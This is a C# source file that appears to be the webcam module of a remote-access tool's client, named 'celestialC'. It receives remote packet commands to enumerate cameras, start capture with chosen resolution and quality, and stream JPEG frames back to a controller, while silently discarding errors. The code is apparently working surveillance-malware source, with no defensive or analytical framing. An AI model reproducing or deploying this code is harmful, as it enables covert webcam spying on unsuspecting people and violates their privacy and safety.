using AForge.Video;
using AForge.Video.DirectShow;
using celestialC.Helper.Networking;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using celestialC.Helper;

namespace celestialC
{
    public class WebCamHelper
    {
        private static VideoCaptureDevice FinalVideo;
        private static MemoryStream Camstream = new MemoryStream();
        private static int Quality = 50;
        private static int delay = 125;

        public static void AutoWebcamPacket(byte[] ToProcess)
        {
            string[] splittedstr = Encoding.UTF8.GetString(ToProcess).Split(';');
            try
            {
                if (splittedstr[0] == "0")
                {
                    List<byte> ToSendDEZ = new List<byte>();
                    ToSendDEZ.Add(15);
                    ToSendDEZ.AddRange(Encoding.UTF8.GetBytes(GetWebcams()));
                    PacketSender.Send(ToSendDEZ.ToArray());
                }
                else if (splittedstr[0] == "1") // on
                {
                    if (Form1.IsCameraWork) return;
                    Form1.IsCameraWork = true;
                    FinalVideo = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[0].MonikerString);
                    FinalVideo.NewFrame += SendWebcamframe;
                    Quality = Convert.ToInt32(splittedstr[2]);
                    delay = Convert.ToInt32(splittedstr[3]);
                    FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[Convert.ToInt32(splittedstr[1])];
                    FinalVideo.Start();
                }
                else if (splittedstr[0] == "2") // off
                {
                    WebcamDispose();
                }
            }
            catch { }
        }

        public static void WebcamDispose()
        {
            var thread = new Thread(() =>
            {
                try
                {
                    Form1.IsCameraWork = false;
                    FinalVideo.Stop();
                    FinalVideo.NewFrame -= SendWebcamframe;
                    MemoryStream camstream = Camstream;
                    if (camstream != null)
                    {
                        camstream.Dispose();
                    }
                }
                catch { }
            });
            thread.Start();
            GC.Collect();
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
            {
                if (imageCodecInfo.FormatID == format.Guid)
                {
                    return imageCodecInfo;
                }
            }
            return null;
        }

        public static void SendWebcamframe(object sender, NewFrameEventArgs e)
        {
            if (!Form1.IsCameraWork)
            {
                WebcamDispose();
                return;
            }
            Bitmap bitmap = (Bitmap)e.Frame.Clone();
            using (Camstream = new MemoryStream())
            {
                System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
                EncoderParameters encoderParameters = new EncoderParameters(1);
                EncoderParameter encoderParameter = new EncoderParameter(quality, Quality);
                encoderParameters.Param[0] = encoderParameter;
                ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
                bitmap.Save(Camstream, encoder, encoderParameters);
                if (encoderParameters != null)
                {
                    encoderParameters.Dispose();
                }
                if (encoderParameter != null)
                {
                    encoderParameter.Dispose();
                }
                if (bitmap != null)
                {
                    bitmap.Dispose();
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add(16);
                ToSend.AddRange(Camstream.ToArray());
                PacketSender.Send(ToSend.ToArray());
                Thread.Sleep(delay);
            }
        }

        public static string GetWebcams()
        {
            string webcamlist = "";
            string delimeter = ";";
            try
            {
                foreach (object obj in new FilterInfoCollection(FilterCategory.VideoInputDevice))
                {
                    FilterInfo filterInfo = (FilterInfo)obj;
                    webcamlist += filterInfo.Name + delimeter;
                    new VideoCaptureDevice(filterInfo.MonikerString);
                }
                return webcamlist;
            }
            catch { return "Client sided exception arrived!"; }
        }

    }
}
